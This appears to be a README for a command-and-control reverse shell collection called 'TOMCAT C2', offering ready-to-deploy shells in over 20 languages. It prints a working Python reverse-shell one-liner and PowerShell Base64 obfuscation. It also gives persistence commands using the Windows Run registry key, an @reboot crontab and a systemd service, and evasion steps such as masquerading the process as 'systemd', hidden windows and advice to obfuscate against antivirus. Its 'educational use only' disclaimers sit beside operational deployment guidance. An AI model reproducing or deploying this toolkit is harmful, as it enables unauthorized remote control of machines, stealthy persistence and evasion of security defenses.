# TOMCAT C2 - Reverse Shell Collection

Collection of reverse shells in various programming languages compatible with **Meterpreter Mode**.

## ðŸŽ¯ Key Features

- **Multi-Language Support**: 20+ programming languages
- **Meterpreter Compatible**: Works with TOMCAT C2 Meterpreter mode
- **Cross-Platform**: Linux, Windows, macOS support
- **Ready to Deploy**: Pre-configured for immediate use

## ðŸ“‹ Available Shells

### Scripting Languages (No Compilation)

| Language | File | Platform | Usage |
|----------|------|----------|-------|
| **Python** | `shell.py` | Linux/macOS | `python3 shell.py` |
| **Python PTY** | `shell_pty.py` | Linux/macOS | `python3 shell_pty.py` |
| **Perl** | `shell.pl` | Linux/macOS | `perl shell.pl` |
| **Ruby** | `shell.rb` | Linux/macOS | `ruby shell.rb` |
| **Ruby PTY** | `shell_pty.rb` | Linux/macOS | `ruby shell_pty.rb` |
| **PHP** | `shell.php` | Linux/macOS | `php shell.php` |
| **Node.js** | `shell.js` | All | `node shell.js` |
| **Node.js (Win)** | `shell_windows.js` | Windows | `node shell_windows.js` |
| **Bash** | `shell.sh` | Linux/macOS | `bash shell.sh` |
| **Bash NC** | `shell_nc.sh` | Linux/macOS | `bash shell_nc.sh` |
| **Bash Telnet** | `shell_telnet.sh` | Linux/macOS | `bash shell_telnet.sh` |
| **PowerShell** | `shell.ps1` | Windows | `powershell -ExecutionPolicy Bypass -File shell.ps1` |
| **PowerShell One-liner** | `shell_oneliner.ps1` | Windows | Copy & paste to terminal |
| **Batch** | `shell.bat` | Windows | `shell.bat` |
| **VBScript** | `shell.vbs` | Windows | `cscript shell.vbs` |
| **Lua** | `shell.lua` | All | `lua shell.lua` |
| **AWK** | `shell.awk` | Linux/macOS | `awk -f shell.awk` |

### Compiled Languages

| Language | File | Compile Command | Platform |
|----------|------|----------------|----------|
| **C** | `shell.c` | `gcc shell.c -o shell` | Linux/macOS |
| **C++** | `shell.cpp` | `g++ shell.cpp -o shell` | Linux/macOS |
| **C++ (Win)** | `shell_windows.cpp` | `x86_64-w64-mingw32-g++ shell_windows.cpp -o shell.exe -lws2_32` | Windows |
| **Java** | `Shell.java` | `javac Shell.java && java Shell` | All |
| **C#** | `Shell.cs` | `mcs Shell.cs -out:Shell.exe` (Linux)<br>`csc Shell.cs` (Windows) | All |
| **Go** | `shell.go` | `go build shell.go` | All |
| **Dart** | `shell.dart` | `dart shell.dart` or `dart compile exe shell.dart` | All |
| **Crystal** | `shell.cr` | `crystal build shell.cr` | Linux/macOS |
| **Nim** | `shell.nim` | `nim c shell.nim` | All |
| **Rust** | `shell.rust` | `rustc shell.rust -o shell` | All |

## ðŸš€ Quick Start

### 1. Start TOMCAT C2 Server in Meterpreter Mode

```bash
python3 start.py -M
```

### 2. Configure Shell

Edit the shell file and change:
```
HOST = "0.0.0.0"    # Change to your C2 server IP
PORT = 4444         # Change to your C2 server port
```

### 3. Deploy Shell

**Scripting Languages:**
```bash
# Python
python3 shell.py

# Node.js
node shell.js

# PowerShell
powershell -ExecutionPolicy Bypass -File shell.ps1
```

**Compiled Languages:**
```bash
# C
gcc shell.c -o shell && ./shell

# Go
go build shell.go && ./shell

# Rust
rustc shell.rust -o shell && ./shell
```

## ðŸ“¦ Compilation Examples

### Cross-Platform Compilation

**Windows Executable (from Linux):**
```bash
# C/C++
x86_64-w64-mingw32-gcc shell.c -o shell.exe
x86_64-w64-mingw32-g++ shell_windows.cpp -o shell.exe -lws2_32

# Go
GOOS=windows GOARCH=amd64 go build -o shell.exe shell.go

# Rust
rustup target add x86_64-pc-windows-gnu
cargo build --target x86_64-pc-windows-gnu --release
```

**Linux Executable:**
```bash
# C
gcc shell.c -o shell -static

# Go
go build -ldflags "-s -w" shell.go

# Rust
cargo build --release
```

**macOS Executable (from Linux):**
```bash
# Go
GOOS=darwin GOARCH=amd64 go build -o shell shell.go
```

## ðŸ”§ Advanced Usage

### Obfuscation

**Base64 Encode PowerShell:**
```powershell
$command = Get-Content shell.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

**Python One-liner:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Persistence

**Windows (Registry):**
```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Shell" /t REG_SZ /d "C:\path\to\shell.exe" /f
```

**Linux (Crontab):**
```bash
(crontab -l 2>/dev/null; echo "@reboot /path/to/shell") | crontab -
```

**Linux (Systemd):**
```bash
cat > /etc/systemd/system/shell.service << 'EOL'
[Unit]
Description=Shell Service

[Service]
ExecStart=/path/to/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOL

systemctl enable shell.service
systemctl start shell.service
```

## ðŸ›¡ï¸ Evasion Techniques

### Hide Process Name

**Linux:**
```bash
exec -a "systemd" ./shell
```

**Windows (PowerShell):**
```powershell
Start-Process -WindowStyle Hidden -FilePath "shell.exe"
```

### Network Obfuscation

Use SOCKS proxy or tunneling:
```bash
# Through SSH tunnel
ssh -D 1080 user@jumphost
# Configure shell to use SOCKS proxy
```

## âš ï¸ Important Notes

1. **Change IP/Port**: Always update the host and port in shell files
2. **Firewall Rules**: Ensure C2 server port is open
3. **Antivirus**: Compiled shells may trigger AV - use obfuscation
4. **Testing**: Test in controlled environment first
5. **Legal**: Only use on systems you own or have permission to test

## ðŸ” Troubleshooting

### Shell Won't Connect

1. Check firewall rules on C2 server:
   ```bash
   sudo ufw allow 4444/tcp
   ```

2. Verify C2 server is running in Meterpreter mode:
   ```bash
   python3 start.py -M
   ```

3. Test connectivity:
   ```bash
   nc -zv SERVER_IP 4444
   ```

### Shell Connects But No Output

1. Try PTY versions (Python PTY, Ruby PTY)
2. Check if shell binary has execute permissions
3. Verify platform compatibility (Linux shell on Windows won't work)

### Compilation Errors

1. Install required compiler:
   ```bash
   # Ubuntu/Debian
   sudo apt install gcc g++ golang rustc
   
   # Fedora/RHEL
   sudo dnf install gcc gcc-c++ golang rust
   ```

2. Install cross-compilation tools:
   ```bash
   sudo apt install mingw-w64
   ```

## ðŸ“š Detection by Shell Type

TOMCAT C2 Meterpreter mode auto-detects shell type:

- **Shell Prompt Detection**: `$`, `#`, `>`, `C:\>`
- **Meterpreter Detection**: TLV packet structure
- **TOMCAT Agent Detection**: JSON response after key exchange

## ðŸŽ“ Educational Use Only

These shells are provided for:
- Security research
- Penetration testing (authorized)
- Red team exercises
- Educational purposes

**Always obtain proper authorization before testing!**

## ðŸ”— Resources

- TOMCAT C2 Documentation: `/mnt/user-data/outputs/METERPRETER_MODE_README.md`
- Quick Setup Guide: `/mnt/user-data/outputs/QUICK_SETUP_METERPRETER.md`

---

**Remember:** With great power comes great responsibility. Use ethically! ðŸ›¡ï¸